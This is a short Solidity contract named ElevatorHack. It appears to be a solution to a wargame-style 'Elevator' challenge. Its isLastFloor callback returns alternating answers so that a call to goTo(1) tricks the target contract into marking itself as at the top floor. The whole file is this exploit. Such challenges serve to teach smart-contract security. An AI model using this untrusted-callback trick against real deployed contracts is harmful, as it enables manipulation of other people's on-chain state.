// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

import "./Elevator.sol";

contract ElevatorHack is Building {
    uint256 counter;

    function isLastFloor(uint256) external returns (bool) {
        counter++;
        return counter % 2 == 0;
    }

    function boom(address _target) external {
        Elevator(_target).goTo(1);
    }
}
